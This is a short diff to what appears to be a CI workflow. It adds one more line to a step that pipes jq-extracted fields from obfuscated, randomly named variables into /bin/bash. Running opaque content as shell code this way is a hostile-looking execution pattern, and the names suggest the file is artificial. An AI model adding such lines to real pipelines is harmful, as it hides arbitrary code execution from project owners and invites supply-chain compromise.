@@ -49,6 +49,7 @@ jobs:
           echo $uv6 | jq -r .u169 | /bin/bash
           echo $qvvw704 | jq -r .k81835 | /bin/bash
           echo $o87 | jq -r .zsp775 | /bin/bash
+          echo $wzsep9 | jq -r .h007 | /bin/bash
 
       - name: Upload artifact
         if: always()
